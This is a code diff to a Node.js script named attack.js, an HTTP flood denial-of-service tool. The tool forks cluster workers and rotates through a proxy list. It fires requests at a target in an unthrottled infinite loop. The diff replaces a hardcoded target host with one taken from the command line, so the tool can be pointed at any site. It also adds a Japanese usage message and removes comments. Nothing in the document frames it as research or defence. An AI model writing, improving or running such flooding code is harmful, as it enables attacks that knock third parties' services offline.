@@ -5,7 +5,14 @@ const { randomBytes } = require('crypto');
 const { cpus } = require('os');
 const cluster = require('cluster');
 
-const TARGET_HOST = 'https://empire.zexcloud.one';
+// CLI target input
+const target = process.argv[2];
+if (!target) {
+  console.log('使い方: node attack.js <ターゲットホスト>');
+  process.exit(1);
+}
+
+const TARGET_HOST = target;
 const TARGET_PORT = 443;
 const TARGET_PATH = '/?id=';
 const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
@@ -25,7 +32,7 @@ if (cluster.isMaster) {
     proxy = PROXIES[proxyIndex];
   }, SWITCH_INTERVAL);
 
-  // Japanese status line - updates in place
+  // Japanese status
   setInterval(() => {
     process.stdout.write(`\r合計リクエスト送信数: ${total.toLocaleString()} `);
   }, 2000);
@@ -63,13 +70,11 @@ if (cluster.isMaster) {
     } catch {}
   }
 
-  // Go absolutely nuclear: remove delay throttling
   const flood = () => {
     while (true) {
-      for (let i = 0; i < 1000; i++) fire(); // 1000 at a time, tight loop
+      for (let i = 0; i < 1000; i++) fire();
     }
   };
 
-  // Instant firestorm
   setImmediate(flood);
 }
